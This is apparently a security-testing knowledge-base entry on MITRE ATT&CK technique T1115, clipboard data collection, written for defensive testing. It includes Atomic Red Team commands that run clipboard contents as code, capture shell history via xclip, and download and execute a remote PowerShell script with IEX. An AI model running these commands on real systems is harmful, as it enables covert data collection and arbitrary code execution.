---
name: "T1115_clipboard-data"
description: "Adversaries may collect data stored in the clipboard from users copying information within or between applications."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1115
  - collection
  - linux
  - macos
  - windows
technique_id: "T1115"
tactic: "collection"
all_tactics:
  - collection
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1115"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1115 Clipboard Data

## High-Level Description

Adversaries may collect data stored in the clipboard from users copying information within or between applications. 

For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation).

macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.

## Kill Chain Phase

- Collection (TA0009)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Clipboard Data technique is applicable to target environment
- [ ] Check Linux systems for indicators of Clipboard Data
- [ ] Check macOS systems for indicators of Clipboard Data
- [ ] Check Windows systems for indicators of Clipboard Data
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Utilize Clipboard to store or execute commands from

Add data to clipboard to copy off or execute commands from.

**Supported Platforms:** windows

```cmd
dir | clip
echo "T1115" > %temp%\T1115.txt
clip < %temp%\T1115.txt
```

### Atomic Test 2: Execute Commands from Clipboard using PowerShell

Utilize PowerShell to echo a command to clipboard and execute it

**Supported Platforms:** windows

```powershell
echo Get-Process | clip
Get-Clipboard | iex
```

### Atomic Test 3: Execute commands from clipboard

Echo a command to clipboard and execute it

**Supported Platforms:** macos

```bash
echo ifconfig | pbcopy
$(pbpaste)
```

### Atomic Test 4: Collect Clipboard Data via VBA

This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed

### Atomic Test 5: Add or copy content to clipboard with xClip

Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.

**Supported Platforms:** linux

```bash
apt install xclip -y
history | tail -n 30 | xclip -sel clip
xclip -o > history.txt
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Clipboard Data by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1115 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Clipboard Data Access with Anomalous Context


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Clipboard Data technique applicable | Low | Collection |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [CISA_AA21_200B](https://www.cisa.gov/uscert/ncas/alerts/aa21-200b)
- [mining_ruby_reversinglabs](https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems)
- [clip_win_server](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip)
- [MSDN Clipboard](https://msdn.microsoft.com/en-us/library/ms649012)
- [Operating with EmPyre](https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363)
- [Atomic Red Team - T1115](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1115)
- [MITRE ATT&CK - T1115](https://attack.mitre.org/techniques/T1115)
